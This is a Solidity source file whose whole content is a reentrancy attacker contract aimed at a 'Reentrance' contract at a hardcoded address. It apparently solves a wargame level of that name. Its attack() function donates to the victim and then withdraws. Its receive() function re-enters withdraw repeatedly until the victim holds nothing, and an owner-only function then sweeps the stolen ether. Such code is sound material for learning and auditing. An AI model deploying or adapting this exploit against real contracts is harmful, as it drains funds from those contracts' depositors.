// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Reentrance victim address
// 0x53468C5Ddfb5007B097263bFaCCe0C38738E00Db
interface Reentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}

contract ReentranceAttacker {
    Reentrance public victim;
    address public owner;

    constructor(address _addr) {
        victim = Reentrance(_addr);

        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Who you are bro?");
        _;
    }

    function attack() external payable {
        victim.donate{value: 0.001 ether}(address(this));

        victim.withdraw(0.001 ether);
    }

    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withdraw(0.001 ether);
        }
    }

    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
